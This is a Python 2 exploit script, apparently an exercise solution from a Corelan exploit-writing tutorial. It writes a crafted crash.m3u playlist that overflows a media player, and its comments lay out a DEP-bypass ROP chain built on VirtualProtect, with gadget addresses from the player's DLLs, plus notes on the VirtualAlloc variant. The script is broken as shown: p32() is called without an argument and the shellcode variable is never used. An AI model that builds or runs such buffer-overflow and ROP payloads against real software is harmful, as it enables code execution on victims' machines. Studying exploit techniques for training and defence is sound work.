# -*- coding: utf-8 -*-
import socket,struct

"""
####################################################################################
# http://thesprawl.org/research/corelan-tutorial-10-exercise-solution/
# EDI simply contains ROP NOP because we need to have
# VirtualProtect in ESI so that  lpAddress (ESP) is automatically
# populated when the PUSHAD is executed.
0x6403650e, # POP EDI # RETN [MediaPlayerCtrl.dll] 
0x61646807, # RETN (ROP NOP) [EPG.dll]

# Store VirtualProtect() in ESI
# The reason we store VirtualProtect in ESI and not in EDI
# is because we want to take advantage of ESP being automatically
# pushed on the stack by the PUSHAD instruction.
0x61642aac, # PUSH EAX # POP ESI # RETN 04 [EPG.dll]

# Store Return Address in EBP
# The goal of this instruction is to simply transfer execution flow to the
# stack and our shellcode. PUSH ESP # RET 04 is equivalent to JMP ESP.
# ESP will be pointing to the contents obtained from EAX since everything
# else will be popped from the stack by the VirtualProtect call.
0x6410ba9b, # POP EBP # RETN [NetReg.dll] 
0x41414141, # Filler (RETN offset compensation)
0x61608b81, # & push esp #  ret 04 [EPG.dll]

# lpAddress will be automatically populated by the PUSHAD instruction.
# PUSHAD will simply take the address stored in ESP just before it is executed
# and push it on the stack right after EBP (ReturnAddress). With this in mind
# it is convenient to place our shellcode immediately after the PUSHAD
# instruction.

# Store dwSize in EBX. 
# 512 bytes from the end of the chain will be marked as Executable. This
# value can be adjusted based on the actual shellcode size using negative
# complement to avoid null bytes.
0x6403bed6, # POP EAX # RETN [MediaPlayerCtrl.dll] 
0xfffffdff, # Value to negate, will become 0x00000201
0x640377e0, # NEG EAX # RETN [MediaPlayerCtrl.dll] 
0x6163dd7f, # PUSH EAX # ADD AL,5E # POP EBX # RETN [EPG.dll]

# Store NewProtect in EDX. 
# 0x40 is equivalent to PAGE_EXECUTE_READWRITE
0x64114086, # POP EAX # RETN [NetReg.dll] 
0xffffffc0, # Value to negate, will become 0x00000040
0x6002d513, # NEG EAX # RETN [Configuration.dll] 
0x640148ce, # XCHG EAX,EDX # RETN 02 [MediaPlayerCtrl.dll]

# Store lpOldProtect in ECX
# The address 0x6404fffb is writeable
0x6002e5c3, # POP ECX # RETN [Configuration.dll] 
0x4141,     # Filler (RETN offset compensation)
0x6404fffb, # &Writable location [MediaPlayerCtrl.dll]

# EAX is set to a regular NOP sled as it will become the 
# beginning of the executed shellcode once JMP ESP is executed
0x6162f773, # POP EAX # RETN [EPG.dll] 
0x90909090, # nop
#####################################################################################
# PUSHAD will push registers on the stack while moving ESP
# register to point to the first pushed register as follows.
# 
#   Stack:
#   EDI (ROP NOP)       <---- ESP now points here
#   ESI (VirtualProtect)
#   EBP (ReturnAddress)
#   ESP (lpAddress)
#   EBX (dwSize)
#   EDX (flNewProtect)
#   ECX (lpflOldProtect)
#   EAX (NOP)
#
# After PUSHAD is executed the RETN will transfer execution
# back to the stack precisely where ROP NOP address was pushed
# from EDI.
0x6002ea81, # PUSHAD # RETN [Configuration.dll]

#----------------------------------------#
# ROP Chain setup for VirtualProtect()   #
#----------------------------------------#
# EAX = NOP (0x90909090)                 #
# ECX = lpOldProtect (ptr to W address)  #
# EDX = NewProtect (0x40)                #
# EBX = dwSize                           #
# ESP = lPAddress (automatic)            #
# EBP = ReturnTo (ptr to jmp esp)        #
# ESI = ptr to VirtualProtect()          #
# EDI = ROP NOP (RETN)                   #
#----------------------------------------#

VirtualProtect()

http://msdn.microsoft.com/en-us/library/aa366898(VS.85).aspx

The VirtualProtect function changes the access protection of memory in the calling process.

#-----------------------------------------
# BOOL WINAPI VirtualProtect(            #
#   __in   LPVOID lpAddress,             #
#   __in   SIZE_T dwSize,                #
#   __in   DWORD flNewProtect,           #
#   __out  PDWORD lpflOldProtect         #
# );                                     #
#-----------------------------------------
#----------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------#
If you want to use this function, you will have to put 5 parameters on the stack :
Return address 	pointer to the location where VirtualProtect() needs to return to. This will be the address of your shellcode on the stack (dynamically created value)
lpAddress 	pointer to the base address of the region of pages whose access protection attributes need to be changed. In essence, this will be the base address of your shellcode on the stack (dynamically created value)
dwsize 	number of bytes (dynamically created value, making sure the entire shellcode can get executed. If the shellcode will expand for some reason (because of decoding for example), then those additional bytes will need to be taken into account and accounted for.
flNewProtect 	option that specifies the new protection option : 0x00000040 : PAGE_EXECUTE_READWRITE. If your shellcode will not modify itself (decoder for example), then a value of 0x00000020 (PAGE_EXECUTE_READ) might work as well
lpflOldProtect 	pointer to variable that will receive the previous access protection value
#----------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------#

Note : The memory protection constants that can be used in VirtualProtect() can be found here

On XP SP3, VirtualProtect() is located at 0x7C801AD4 (kernel32.dll)
"""
#----------------------------------------#
# ROP Chain setup for VirtualAlloc()     #
#----------------------------------------#
# EAX = NOP (0x90909090)                 #
# ECX = flProtect (0x40)                 #
# EDX = flAllocationType (0x1000)        #
# EBX = dwSize                           #
# ESP = lpAddress (automatic)            #
# EBP = ReturnTo (ptr to jmp esp)        # 
# ESI = ptr to VirtualAlloc()            #
# EDI = ROP NOP (RETN)                   #
#----------------------------------------#

#VirtualAlloc()

#This function will allocate new memory. One of the parameters to this function specifies the execution/access level of the newly allocated memory, so the goal is to set that value to EXECUTE_READWRITE.

#http://msdn.microsoft.com/en-us/library/aa366887(VS.85).aspx

#-----------------------------------------
#LPVOID WINAPI VirtualAlloc(             #
#  __in_opt  LPVOID lpAddress,           #
#  __in      SIZE_T dwSize,              #
#  __in      DWORD flAllocationType,     #
#  __in      DWORD flProtect             #
# );                                     #
#-----------------------------------------
#----------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------#
# This function requires you to set up a stack that contains the following values :
# Return Address 	Function return address (= address where function needs to return to after it has finished). I will talk about this value in a few moments
# lpAddress 	Starting address of region to allocate (= new location where you want to allocate memory). Keep in mind that this address might get rounded to the nearest multiple of the allocation granularity.� You can try to put a provide a hardcoded value for this parameter
# dwSize 	Size of the region in bytes. (you will most likely need to generate this value using rop, unless your exploit can deal with null bytes)
# flAllocationType 	Set to 0x1000 (MEM_COMMIT). Might need rop to generate & write this value to the stack
# flProtect 	Set to 0x40 (EXECUTE_READWRITE). Might need rop to generate & write this value to the stack
#----------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------#

def p32(x):
    return struct.pack("I",x)

shellcode = "\xCC" * 400

rop =  p32() 

crash = "http://."
crash += "A"*17416
crash += rop
crash += "\x90" * 200
final_crash = "C"*(7572-len(rop)-200)

try:
    path = "crash.m3u"
    open(path,"wb").write(crash+final_crash)
    print "Payload was written at: {}!".format(path)
except Exception as e:
    print "[-] {}".format(e)

